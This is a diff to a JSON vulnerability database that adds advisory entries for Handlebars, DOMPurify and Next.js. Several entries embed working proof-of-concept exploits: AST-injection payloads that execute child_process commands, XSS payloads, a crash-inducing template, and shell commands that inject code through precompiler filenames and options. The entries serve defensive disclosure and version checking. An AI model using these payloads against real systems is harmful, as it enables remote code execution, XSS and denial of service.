@@ -4531,6 +4531,132 @@
           "info": [
             "https://nvd.nist.gov/vuln/detail/CVE-2021-23369"
           ]
+        },
+        {
+          "atOrAbove": "4.0.0",
+          "below": "4.7.9",
+          "severity": "medium",
+          "cwe": [
+            "CWE-1321",
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "## Summary\n\n`resolvePartial()` in the Handlebars runtime resolves partial names via a plain property lookup on `options.partials` without guarding against prototype-chain traversal. When `Object.prototype` has been polluted with a string value whose key matches a partial reference in a template, the polluted string is used as the partial body and rendered **without HTML escaping**, resulting in reflected or stored XSS.\n\n## Description\n\nThe root cause is in `lib/handlebars/runtime.js` inside `resolvePartial()` and `invokePartial()`:\n\n```javascript\n// Vulnerable: plain bracket access traverses Object.prototype\npartial = options.partials[options.name];\n```\n\n`hasOwnProperty` is never checked, so if `Object.prototype` has been seeded with a key whose name matches a partial reference in the template (e.g. `widget`), the lookup succeeds and the polluted string is returned. The runtime emits a prototype-access warning, but the partial is still resolved and its content is inserted into the rendered output unescaped. This contradicts the documented security model and is distinct from CVE-2021-23369 and CVE-2021-23383, which addressed data property access rather than partial template resolution.\n\n**Prerequisites for exploitation:**\n1. The target application must be vulnerable to prototype pollution (e.g. via `qs`, `minimist`, or\n   any querystring/JSON merge sink).\n2. The attacker must know or guess the name of a partial reference used in a template.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars');\n\n// Step 1: Prototype pollution (via qs, minimist, or another vector)\nObject.prototype.widget = '<img src=x onerror=\"alert(document.domain)\">';\n\n// Step 2: Normal template that references a partial\nconst template = Handlebars.compile('<div>Welcome! {{> widget}}</div>');\n\n// Step 3: Render — XSS payload injected unescaped\nconst output = template({});\n// Output: <div>Welcome! <img src=x onerror=\"alert(document.domain)\"></div>\n```\n\n> The runtime prints a prototype access warning claiming \"access has been denied,\" but the partial still resolves and returns the polluted value.\n\n## Workarounds\n\n- Apply `Object.freeze(Object.prototype)` early in application startup to prevent prototype  pollution. Note: this may break other libraries.\n- Use the Handlebars runtime-only build (`handlebars/runtime`), which does not compile templates  and reduces the attack surface.",
+            "githubID": "GHSA-2qvq-rjwj-gvw9",
+            "CVE": [
+              "CVE-2026-33916"
+            ]
+          },
+          "info": [
+            "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-2qvq-rjwj-gvw9",
+            "https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2",
+            "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9"
+          ]
+        },
+        {
+          "atOrAbove": "4.0.0",
+          "below": "4.7.9",
+          "severity": "critical",
+          "cwe": [
+            "CWE-843",
+            "CWE-94"
+          ],
+          "identifiers": {
+            "summary": "## Summary\n\n`Handlebars.compile()` accepts a pre-parsed AST object in addition to a template string. The `value` field of a `NumberLiteral` AST node is emitted directly into the generated JavaScript without quoting or sanitization. An attacker who can supply a crafted AST to `compile()` can therefore inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`Handlebars.compile()` accepts either a template string or a pre-parsed AST. When an AST is supplied, the JavaScript code generator in `lib/handlebars/compiler/javascript-compiler.js` emits `NumberLiteral` values verbatim:\n\n```javascript\n// Simplified representation of the vulnerable code path:\n// NumberLiteral.value is appended to the generated code without escaping\ncompiledCode += numberLiteralNode.value;\n```\n\nBecause the value is not wrapped in quotes or otherwise sanitized, passing a string such as `{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() //` as the `value` of a `NumberLiteral` causes the generated `eval`-ed code to break out of its intended context and execute arbitrary commands.\n\nAny endpoint that deserializes user-controlled JSON and passes the result directly to `Handlebars.compile()` is exploitable.\n\n## Proof of Concept\n\nServer-side Express application that passes `req.body.text` to `Handlebars.compile()`:\n\n\n```Javascript\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"/api/render\", (req, res) => {\n  let text = req.body.text;\n  let template = Handlebars.compile(text);\n  let result = template();\n  res.send(result);\n});\n\napp.listen(2123);\n```\n\n```\nPOST /api/render HTTP/1.1\nContent-Type: application/json\nHost: 127.0.0.1:2123\n\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"body\": [\n      {\n        \"type\": \"MustacheStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\",\n          \"data\": false,\n          \"depth\": 0,\n          \"parts\": [\"lookup\"],\n          \"original\": \"lookup\",\n          \"loc\": null\n        },\n        \"params\": [\n          {\n            \"type\": \"PathExpression\",\n            \"data\": false,\n            \"depth\": 0,\n            \"parts\": [],\n            \"original\": \"this\",\n            \"loc\": null\n          },\n          {\n            \"type\": \"NumberLiteral\",\n            \"value\": \"{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() //\",\n            \"original\": 1,\n            \"loc\": null\n          }\n        ],\n        \"escaped\": true,\n        \"strip\": { \"open\": false, \"close\": false },\n        \"loc\": null\n      }\n    ]\n  }\n}\n```\n\nThe response body will contain the output of the `id` command executed on the server.\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.",
+            "githubID": "GHSA-2w6w-674q-4c4q",
+            "CVE": [
+              "CVE-2026-33937"
+            ]
+          },
+          "info": [
+            "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-2w6w-674q-4c4q",
+            "https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2",
+            "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9"
+          ]
+        },
+        {
+          "atOrAbove": "4.0.0",
+          "below": "4.7.9",
+          "severity": "high",
+          "cwe": [
+            "CWE-843",
+            "CWE-94"
+          ],
+          "identifiers": {
+            "summary": "## Summary\n\nThe `@partial-block` special variable is stored in the template data context and is reachable and mutable from within a template via helpers that accept arbitrary objects. When a helper overwrites `@partial-block` with a crafted Handlebars AST, a subsequent invocation of `{{> @partial-block}}` compiles and executes that AST, enabling arbitrary JavaScript execution on the server.\n\n## Description\n\nHandlebars stores `@partial-block` in the `data` frame that is accessible to templates. In nested contexts, a parent frame's `@partial-block` is reachable as `@_parent.partial-block`. Because the data frame is a mutable object, any registered helper that accepts an object reference and assigns properties to it can overwrite `@partial-block` with an attacker-controlled value.\n\nWhen `{{> @partial-block}}` is subsequently evaluated, `invokePartial` receives the crafted object. The runtime, finding an object that is not a compiled function, falls back to **dynamically compiling** the value via `env.compile()`. If that value is a well-formed Handlebars AST containing injected code, the injected JavaScript runs in the server process.\n\nThe `handlebars-helpers` npm package (commonly used with Handlebars) includes several helpers such as `merge` that can be used as the mutation primitive.\n\n## Proof of Concept\n\nTested with Handlebars 4.7.8 and `handlebars-helpers`:\n\n```javascript\nconst Handlebars = require('handlebars');\nconst merge = require('handlebars-helpers').object().merge;\nHandlebars.registerHelper('merge', merge);\n\nconst vulnerableTemplate = `\n{{#*inline \"myPartial\"}}\n    {{>@partial-block}}\n    {{>@partial-block}}\n{{/inline}}\n{{#>myPartial}}\n    {{merge @_parent partial-block=1}}\n    {{merge @_parent partial-block=payload}}\n{{/myPartial}}\n`;\n\nconst maliciousContext = {\n  payload: {\n    type: \"Program\",\n    body: [\n      {\n        type: \"MustacheStatement\",\n        depth: 0,\n        path: {\n          type: \"PathExpression\",\n          parts: [\"pop\"],\n          original: \"this.pop\",\n          // Code injected via depth field — breaks out of generated function call\n          depth: \"0])),function () {console.error('VULNERABLE: RCE via @partial-block');}()));//\",\n        },\n      },\n    ],\n  },\n};\n\nHandlebars.compile(vulnerableTemplate)(maliciousContext);\n// Prints: VULNERABLE: RCE via @partial-block\n```\n\n## Workarounds\n\n- **Use the runtime-only build** (`require('handlebars/runtime')`). The `compile()` method is  absent, eliminating the vulnerable fallback path.\n- **Audit registered helpers** for any that write arbitrary values to context objects. Helpers  should treat context data as read-only.\n- **Avoid registering helpers** from third-party packages (such as `handlebars-helpers`) in  contexts where templates or context data can be influenced by untrusted input.",
+            "githubID": "GHSA-3mfm-83xf-c92r",
+            "CVE": [
+              "CVE-2026-33938"
+            ]
+          },
+          "info": [
+            "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-3mfm-83xf-c92r",
+            "https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2",
+            "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9"
+          ]
+        },
+        {
+          "atOrAbove": "4.0.0",
+          "below": "4.7.9",
+          "severity": "high",
+          "cwe": [
+            "CWE-754"
+          ],
+          "identifiers": {
+            "summary": "## Summary\n\nWhen a Handlebars template contains decorator syntax referencing an unregistered decorator (e.g. `{{*n}}`), the compiled template calls `lookupProperty(decorators, \"n\")`, which returns `undefined`. The runtime then immediately invokes the result as a function, causing an unhandled `TypeError: ... is not a function` that crashes the Node.js process. Any application that compiles user-supplied templates without wrapping the call in a `try/catch` is vulnerable to a single-request Denial of Service.\n\n## Description\n\nIn `lib/handlebars/compiler/javascript-compiler.js`, the code generated for a decorator invocation looks like:\n\n```javascript\nfn = lookupProperty(decorators, \"n\")(fn, props, container, options) || fn;\n```\n\nWhen `\"n\"` is not a registered decorator, `lookupProperty(decorators, \"n\")` returns `undefined`. The expression immediately attempts to call `undefined` as a function, producing:\n\n```\nTypeError: lookupProperty(...) is not a function\n```\n\nBecause the error is thrown inside the compiled template function and is not caught by the runtime, it propagates up as an unhandled exception and — when not caught by the application — crashes the Node.js process.\n\nThis inconsistency is notable: references to unregistered **helpers** produce a clean `\"Missing helper: ...\"` error, while references to unregistered **decorators** cause a hard crash.\n\n**Attack scenario:** An attacker submits `{{*n}}` as template content to any endpoint that calls `Handlebars.compile(userInput)()`. Each request crashes the server process; with process managers that auto-restart (PM2, systemd), repeated submissions create a persistent DoS.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars'); // Handlebars 4.7.8, Node.js v22.x\n\n// Any of these payloads crash the process\nHandlebars.compile('{{*n}}')({});\nHandlebars.compile('{{*decorator}}')({});\nHandlebars.compile('{{*constructor}}')({});\n```\n\nExpected crash output:\n```\nTypeError: lookupProperty(...) is not a function\n    at Function.eval [as decorator] (eval at compile (...javascript-compiler.js:134:36))\n```\n\n## Workarounds\n\n- **Wrap compilation and rendering in `try/catch`:**\n  ```javascript\n  try {\n    const result = Handlebars.compile(userInput)(context);\n    res.send(result);\n  } catch (err) {\n    res.status(400).send('Invalid template');\n  }\n  ```\n- **Validate template input** before passing it to `compile()`. Reject templates containing  decorator syntax (`{{*...}}`) if decorators are not used in your application.\n- **Use the pre-compilation workflow:** compile templates at build time and serve only pre-compiled  templates; do not call `compile()` at request time.",
+            "githubID": "GHSA-9cx6-37pm-9jff",
+            "CVE": [
+              "CVE-2026-33939"
+            ]
+          },
+          "info": [
+            "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-9cx6-37pm-9jff",
+            "https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2",
+            "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9"
+          ]
+        },
+        {
+          "atOrAbove": "4.0.0",
+          "below": "4.7.9",
+          "severity": "high",
+          "cwe": [
+            "CWE-843",
+            "CWE-94"
+          ],
+          "identifiers": {
+            "summary": "## Summary\n\nA crafted object placed in the template context can bypass all conditional guards in `resolvePartial()` and cause `invokePartial()` to return `undefined`. The Handlebars runtime then treats the unresolved partial as a source that needs to be compiled, passing the crafted object to `env.compile()`. Because the object is a valid Handlebars AST containing injected code, the generated JavaScript executes arbitrary commands on the server. The attack requires the adversary to control a value that can be returned by a dynamic partial lookup.\n\n## Description\n\nThe vulnerable code path spans two functions in `lib/handlebars/runtime.js`:\n\n**`resolvePartial()`:** A crafted object with `call: true` satisfies the first branch condition (`partial.call`) and causes an early return of the original object itself, because none of the remaining conditionals (string check, `options.partials` lookup, etc.) match a plain object. The function returns the crafted object as-is.\n\n**`invokePartial()`:** When `resolvePartial` returns a non-function object, `invokePartial` produces `undefined`. The runtime interprets `undefined` as \"partial not yet compiled\" and calls `env.compile(partial, ...)` where `partial` is the crafted AST object. The JavaScript code generator processes the AST and emits JavaScript containing the injected payload, which is then evaluated.\n\n**Minimum prerequisites:**\n1. The template uses a dynamic partial lookup: `{{> (lookup . \"key\")}}` or equivalent.\n2. The adversary can set the value of the looked-up context property to a crafted object.\n\nIn server-side rendering scenarios where templates process user-supplied context data, this enables full Remote Code Execution.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars');\n\nconst vulnerableTemplate = `{{> (lookup . \"payload\")}}`;\n\nconst maliciousContext = {\n  payload: {\n    call: true, // bypasses the primary resolvePartial branch\n    type: \"Program\",\n    body: [\n      {\n        type: \"MustacheStatement\",\n        depth: 0,\n        path: {\n          type: \"PathExpression\",\n          parts: [\"pop\"],\n          original: \"this.pop\",\n          // Injected code breaks out of the generated function's argument list\n          depth: \"0])),function () {console.error('VULNERABLE: object -> dynamic partial -> RCE');}()));//\",\n        },\n      },\n    ],\n  },\n};\n\nHandlebars.compile(vulnerableTemplate)(maliciousContext);\n// Prints: VULNERABLE: object -> dynamic partial -> RCE\n```\n\n## Workarounds\n\n- **Use the runtime-only build** (`require('handlebars/runtime')`). Without `compile()`,  the fallback compilation path in `invokePartial` is unreachable.\n- **Sanitize context data** before rendering: ensure no value in the context is a non-primitive  object that could be passed to a dynamic partial.\n- **Avoid dynamic partial lookups** (`{{> (lookup ...)}}`) when context data is user-controlled.",
+            "githubID": "GHSA-xhpv-hc6g-r9c6",
+            "CVE": [
+              "CVE-2026-33940"
+            ]
+          },
+          "info": [
+            "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xhpv-hc6g-r9c6",
+            "https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2",
+            "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9"
+          ]
+        },
+        {
+          "atOrAbove": "4.0.0",
+          "below": "4.7.9",
+          "severity": "high",
+          "cwe": [
+            "CWE-116",
+            "CWE-79",
+            "CWE-94"
+          ],
+          "identifiers": {
+            "summary": "## Summary\n\nThe Handlebars CLI precompiler (`bin/handlebars` / `lib/precompiler.js`) concatenates user-controlled strings — template file names and several CLI options — directly into the JavaScript it emits, without any escaping or sanitization. An attacker who can influence template filenames or CLI arguments can inject arbitrary JavaScript that executes when the generated bundle is loaded in Node.js or a browser.\n\n## Description\n\n`lib/precompiler.js` generates JavaScript source by string-interpolating several values directly into the output. Four distinct injection points exist:\n\n### 1. Template name injection\n\n```javascript\n// Vulnerable code pattern\noutput += 'templates[\"' + template.name + '\"] = template(...)';\n```\n\n`template.name` is derived from the file system path. A filename containing `\"` or `'];` breaks out of the string literal and injects arbitrary JavaScript.\n\n### 2. Namespace injection (`-n` / `--namespace`)\n\n```javascript\n// Vulnerable code pattern\noutput += 'var templates = ' + opts.namespace + ' = ' + opts.namespace + ' || {};';\n```\n\n`opts.namespace` is emitted as raw JavaScript. Anything after a `;` in the value becomes an additional JavaScript statement.\n\n### 3. CommonJS path injection (`-c` / `--commonjs`)\n\n```javascript\n// Vulnerable code pattern\noutput += 'var Handlebars = require(\"' + opts.commonjs + '\");';\n```\n\n`opts.commonjs` is interpolated inside double quotes with no escaping, allowing `\"` to close the string and inject further code.\n\n### 4. AMD path injection (`-h` / `--handlebarPath`)\n\n```javascript\n// Vulnerable code pattern\noutput += \"define(['\" + opts.handlebarPath + \"handlebars.runtime'], ...)\";\n```\n\n`opts.handlebarPath` is interpolated inside single quotes, allowing `'` to close the array element.\n\nAll four injection points result in code that executes when the generated bundle is `require()`d or loaded in a browser.\n\n## Proof of Concept\n\n**Template name vector (creates a file `pwned` on disk):**\n\n```bash\nmkdir -p templates\nprintf 'Hello' > \"templates/evil'] = (function(){require(\\\"fs\\\").writeFileSync(\\\"pwned\\\",\\\"1\\\")})(); //.handlebars\"\n\nnode bin/handlebars templates -o out.js\nnode -e 'require(\"./out.js\")'  # Executes injected code, creates ./pwned\n```\n\n**Namespace vector:**\n\n```bash\nnode bin/handlebars templates -o out.js \\\n  -n \"App.ns; require('fs').writeFileSync('pwned2','1'); //\"\nnode -e 'require(\"./out.js\")'\n```\n\n**CommonJS vector:**\n\n```bash\nnode bin/handlebars templates -o out.js \\\n  -c 'handlebars\"); require(\"fs\").writeFileSync(\"pwned3\",\"1\"); //'\nnode -e 'require(\"./out.js\")'\n```\n\n**AMD vector:**\n\n```bash\nnode bin/handlebars templates -o out.js -a \\\n  -h \"'); require('fs').writeFileSync('pwned4','1'); // \"\nnode -e 'require(\"./out.js\")'\n```\n\n## Workarounds\n\n- **Validate all CLI inputs** before invoking the precompiler. Reject filenames and option values  that contain characters with JavaScript string-escaping significance (`\"`, `'`, `;`, etc.).\n- **Use a fixed, trusted namespace string** passed via a configuration file rather than  command-line arguments in automated pipelines.\n- **Run the precompiler in a sandboxed environment** (container with no write access to sensitive  paths) to limit the impact of successful exploitation.\n- **Audit template filenames** in any repository or package that is consumed by an automated  build pipeline.",
+            "githubID": "GHSA-xjpj-3mr7-gcpf",
+            "CVE": [
+              "CVE-2026-33941"
+            ]
+          },
+          "info": [
+            "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xjpj-3mr7-gcpf",
+            "https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2",
+            "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9"
+          ]
         }
       ],
       "extractors": {
@@ -5229,6 +5355,22 @@
             "https://github.com/cure53/DOMPurify/commit/c861f5a83fb8d90800f1680f855fee551161ac2b",
             "https://www.vulncheck.com/advisories/dompurify-xss-via-textarea-rawtext-bypass-in-safe-for-xml",
             "https://www.vulncheck.com/advisories/dompurify-xss-via-textarea-rawtext-bypass-in-safeforxml"
+          ]
+        },
+        {
+          "atOrAbove": "0",
+          "below": "3.3.2",
+          "severity": "medium",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "## Description\n\nA mutation-XSS (mXSS) condition was confirmed when sanitized HTML is reinserted into a new parsing context using `innerHTML` and special wrappers. The vulnerable wrappers confirmed in browser behavior are `script`, `xmp`, `iframe`, `noembed`, `noframes`, and `noscript`. The payload remains seemingly benign after `DOMPurify.sanitize()`, but mutates during the second parse into executable markup with an event handler, enabling JavaScript execution in the client (`alert(1)` in the PoC).\n\n\n## Vulnerability\n\nThe root cause is context switching after sanitization: sanitized output is treated as trusted and concatenated into a wrapper string (for example, `<xmp> ... </xmp>` or other special wrappers) before being reparsed by the browser. In this flow, attacker-controlled text inside an attribute (for example `</xmp>` or equivalent closing sequences for each wrapper) closes the special parsing context early and reintroduces attacker markup (`<img ... onerror=...>`) outside the original attribute context. DOMPurify sanitizes the original parse tree, but the application performs a second parse in a different context, reactivating dangerous tokens (classic mXSS pattern).\n\n## PoC\n\n1. Start the PoC app:\n```bash\nnpm install\nnpm start\n```\n\n2. Open `http://localhost:3001`.\n3. Set `Wrapper en sink` to `xmp`.\n4. Use payload:\n```html\n <img src=x alt=\"</xmp><img src=x onerror=alert('expoc')>\">\n```\n\n5. Click `Sanitize + Render`.\n6. Observe:\n- `Sanitized response` still contains the `</xmp>` sequence inside `alt`.\n- The sink reparses to include `<img src=\"x\" onerror=\"alert('expoc')\">`.\n- `alert('expoc')` is triggered.\n7. Files:\n- index.html\n\n```html\n<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>expoc - DOMPurify SSR PoC</title>\n    <style>\n      :root {\n        --bg: #f7f8fb;\n        --panel: #ffffff;\n        --line: #d8dce6;\n        --text: #0f172a;\n        --muted: #475569;\n        --accent: #0ea5e9;\n      }\n\n      * {\n        box-sizing: border-box;\n      }\n\n      body {\n        margin: 0;\n        font-family: \"SF Mono\", Menlo, Consolas, monospace;\n        color: var(--text);\n        background: radial-gradient(circle at 10% 0%, #e0f2fe 0%, var(--bg) 60%);\n      }\n\n      main {\n        max-width: 980px;\n        margin: 28px auto;\n        padding: 0 16px 20px;\n      }\n\n      h1 {\n        margin: 0 0 10px;\n        font-size: 1.45rem;\n      }\n\n      p {\n        margin: 0;\n        color: var(--muted);\n      }\n\n      .grid {\n        display: grid;\n        gap: 14px;\n        margin-top: 16px;\n      }\n\n      .card {\n        background: var(--panel);\n        border: 1px solid var(--line);\n        border-radius: 12px;\n        padding: 14px;\n      }\n\n      label {\n        display: block;\n        margin-bottom: 7px;\n        font-size: 0.85rem;\n        color: var(--muted);\n      }\n\n      textarea,\n      input,\n      select,\n      button {\n        width: 100%;\n        border: 1px solid var(--line);\n        border-radius: 8px;\n        padding: 9px 10px;\n        font: inherit;\n        background: #fff;\n      }\n\n      textarea {\n        min-height: 110px;\n        resize: vertical;\n      }\n\n      .row {\n        display: grid;\n        grid-template-columns: 1fr 230px;\n        gap: 12px;\n      }\n\n      button {\n        cursor: pointer;\n        background: var(--accent);\n        color: #fff;\n        border-color: #0284c7;\n      }\n\n      #sink {\n        min-height: 90px;\n        border: 1px dashed #94a3b8;\n        border-radius: 8px;\n        padding: 10px;\n        background: #f8fafc;\n      }\n\n      pre {\n        margin: 0;\n        white-space: pre-wrap;\n        word-break: break-word;\n      }\n\n      .note {\n        margin-top: 8px;\n        font-size: 0.85rem;\n      }\n\n      .status-grid {\n        display: grid;\n        grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));\n        gap: 8px;\n        margin-top: 10px;\n      }\n\n      .status-item {\n        border: 1px solid var(--line);\n        border-radius: 8px;\n        padding: 8px 10px;\n        font-size: 0.85rem;\n        background: #fff;\n      }\n\n      .status-item.vuln {\n        border-color: #ef4444;\n        background: #fef2f2;\n      }\n\n      .status-item.safe {\n        border-color: #22c55e;\n        background: #f0fdf4;\n      }\n\n      @media (max-width: 760px) {\n        .row {\n          grid-template-columns: 1fr;\n        }\n      }\n    </style>\n  </head>\n  <body>\n    <main>\n      <h1>expoc - DOMPurify Server-Side PoC</h1>\n      <p>\n        Flujo: input -> POST /sanitize (Node + jsdom + DOMPurify) -> render vulnerable con innerHTML.\n      </p>\n\n      <div class=\"grid\">\n        <section class=\"card\">\n          <label for=\"payload\">Payload</label>\n          <textarea id=\"payload\"><img src=x alt=\"</script><img src=x onerror=alert('expoc')>\"></textarea>\n          <div class=\"row\" style=\"margin-top: 10px;\">\n            <div>\n              <label for=\"wrapper\">Wrapper en sink</label>\n              <select id=\"wrapper\">\n                <option value=\"div\">div</option>\n                <option value=\"textarea\">textarea</option>\n                <option value=\"title\">title</option>\n                <option value=\"style\">style</option>\n                <option value=\"script\" selected>script</option>\n                <option value=\"xmp\">xmp</option>\n                <option value=\"iframe\">iframe</option>\n                <option value=\"noembed\">noembed</option>\n                <option value=\"noframes\">noframes</option>\n                <option value=\"noscript\">noscript</option>\n              </select>\n            </div>\n            <div style=\"display:flex;align-items:end;\">\n              <button id=\"run\" type=\"button\">Sanitize + Render</button>\n            </div>\n          </div>\n          <p class=\"note\">Se usa render vulnerable: <code>sink.innerHTML = '&lt;wrapper&gt;' + sanitized + '&lt;/wrapper&gt;'</code>.</p>\n          <div class=\"status-grid\">\n            <div class=\"status-item vuln\">script (vulnerable)</div>\n            <div class=\"status-item vuln\">xmp (vulnerable)</div>\n            <div class=\"status-item vuln\">iframe (vulnerable)</div>\n            <div class=\"status-item vuln\">noembed (vulnerable)</div>\n            <div class=\"status-item vuln\">noframes (vulnerable)</div>\n            <div class=\"status-item vuln\">noscript (vulnerable)</div>\n            <div class=\"status-item safe\">div (no vulnerable)</div>\n            <div class=\"status-item safe\">textarea (no vulnerable)</div>\n            <div class=\"status-item safe\">title (no vulnerable)</div>\n            <div class=\"status-item safe\">style (no vulnerable)</div>\n          </div>\n        </section>\n\n        <section class=\"card\">\n          <label>Sanitized response</label>\n          <pre id=\"sanitized\">(empty)</pre>\n        </section>\n\n        <section class=\"card\">\n          <label>Sink</label>\n          <div id=\"sink\"></div>\n        </section>\n      </div>\n    </main>\n\n    <script>\n      const payload = document.getElementById('payload');\n      const wrapper = document.getElementById('wrapper');\n      const run = document.getElementById('run');\n      const sanitizedNode = document.getElementById('sanitized');\n      const sink = document.getElementById('sink');\n\n      run.addEventListener('click', async () => {\n        const response = await fetch('/sanitize', {\n          method: 'POST',\n          headers: { 'Content-Type': 'application/json' },\n          body: JSON.stringify({ input: payload.value })\n        });\n\n        const data = await response.json();\n        const sanitized = data.sanitized || '';\n        const w = wrapper.value;\n\n        sanitizedNode.textContent = sanitized;\n        sink.innerHTML = '<' + w + '>' + sanitized + '</' + w + '>';\n      });\n    </script>\n  </body>\n</html>\n```\n\n- server.js\n\n```js\nconst express = require('express');\nconst path = require('path');\nconst { JSDOM } = require('jsdom');\nconst createDOMPurify = require('dompurify');\n\nconst app = express();\nconst port = process.env.PORT || 3001;\n\nconst window = new JSDOM('').window;\nconst DOMPurify = createDOMPurify(window);\n\napp.use(express.json());\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.get('/health', (_req, res) => {\n  res.json({ ok: true, service: 'expoc' });\n});\n\napp.post('/sanitize', (req, res) => {\n  const input = typeof req.body?.input === 'string' ? req.body.input : '';\n  const sanitized = DOMPurify.sanitize(input);\n  res.json({ sanitized });\n});\n\napp.listen(port, () => {\n  console.log(`expoc running at http://localhost:${port}`);\n});\n```\n\n- package.json\n\n```json\n{\n  \"name\": \"expoc\",\n  \"version\": \"1.0.0\",\n  \"main\": \"server.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"start\": \"node server.js\",\n    \"dev\": \"node server.js\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"description\": \"\",\n  \"dependencies\": {\n    \"dompurify\": \"^3.3.1\",\n    \"express\": \"^5.2.1\",\n    \"jsdom\": \"^28.1.0\"\n  }\n}\n```\n\n## Evidence\n\n- PoC\n\n[daft-video.webm](https://github.com/user-attachments/assets/499a593d-0241-4ab8-95a9-cf49a00bda90)\n\n- XSS triggered\n<img width=\"2746\" height=\"1588\" alt=\"daft-img\" src=\"https://github.com/user-attachments/assets/1f463c14-d5a3-4c93-94e4-12d2d02c7d15\" />\n\n## Why This Happens\nThis is a mutation-XSS pattern caused by a parse-context mismatch:\n\n- Parse 1 (sanitization phase): input is interpreted under normal HTML parsing rules.\n- Parse 2 (sink phase): sanitized output is embedded into a wrapper that changes parser state (`xmp` raw-text behavior).\n- Attacker-controlled sequence (`</xmp>`) gains structural meaning in parse 2 and alters DOM structure.\n\nSanitization is not a universal guarantee across all future parsing contexts. The sink design reintroduces risk.\n\n## Remediation Guidance\n1. Do not concatenate sanitized strings into new HTML wrappers followed by `innerHTML`.\n2. Keep the rendering context stable from sanitize to sink.\n3. Prefer DOM-safe APIs (`textContent`, `createElement`, `setAttribute`) over string-based HTML composition.\n4. If HTML insertion is required, sanitize as close as possible to final insertion context and avoid wrapper constructs with raw-text semantics (`xmp`, `script`, etc.).\n5. Add regression tests for context-switch/mXSS payloads (including `</xmp>`, `</noscript>`, similar parser-breakout markers).\n\nReported by Oscar Uribe, Security Researcher at Fluid Attacks. Camilo Vera and Cristian Vargas from the Fluid Attacks Research Team have identified a mXSS via Re-Contextualization in DomPurify 3.3.1.\n\nFollowing Fluid Attacks [Disclosure Policy](https://fluidattacks.com/advisories/policy), if this report corresponds to a vulnerability and the conditions outlined in the policy are met, this advisory will be published on the website over the next few days (the timeline may vary depending on maintainers' willingness to attend to and respond to this report) at the following URL: https://fluidattacks.com/advisories/daft\n\nAcknowledgements: [Camilo Vera](https://github.com/caverav/) and [Cristian Vargas](https://github.com/tachote).",
+            "githubID": "GHSA-h8r8-wccr-v5f2"
+          },
+          "info": [
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-h8r8-wccr-v5f2",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.3.2"
           ]
         },
         {
@@ -9437,6 +9579,26 @@
           ]
         },
         {
+          "atOrAbove": "10.0.0",
+          "below": "15.5.14",
+          "severity": "medium",
+          "cwe": [
+            "CWE-400"
+          ],
+          "identifiers": {
+            "summary": "## Summary\nThe default Next.js image optimization disk cache (`/_next/image`) did not have a configurable upper bound, allowing unbounded cache growth.\n\n## Impact\nAn attacker could generate many unique image-optimization variants and exhaust disk space, causing denial of service.\n\n## Patches\nFixed by adding an LRU-backed disk cache with `images.maximumDiskCacheSize`, including eviction of least-recently-used entries when the limit is exceeded. Setting `maximumDiskCacheSize: 0` disables disk caching. \n\n## Workarounds\nIf upgrade is not immediately possible:\n- Periodically clean `.next/cache/images`.\n- Reduce variant cardinality (e.g., tighten values for `images.localPatterns`, `images.remotePatterns`, and `images.qualities`)",
+            "githubID": "GHSA-3x4c-7xq6-9pq8",
+            "CVE": [
+              "CVE-2026-27980"
+            ]
+          },
+          "info": [
+            "https://github.com/vercel/next.js/security/advisories/GHSA-3x4c-7xq6-9pq8",
+            "https://github.com/vercel/next.js/commit/39eb8e0ac498b48855a0430fbf4c22276a73b4bd",
+            "https://github.com/vercel/next.js/releases/tag/v16.1.7"
+          ]
+        },
+        {
           "atOrAbove": "15.6.0-canary.0",
           "below": "15.6.0-canary.59",
           "severity": "high",
@@ -9749,6 +9911,26 @@
         },
         {
           "atOrAbove": "10.0.0",
+          "below": "16.1.7",
+          "severity": "medium",
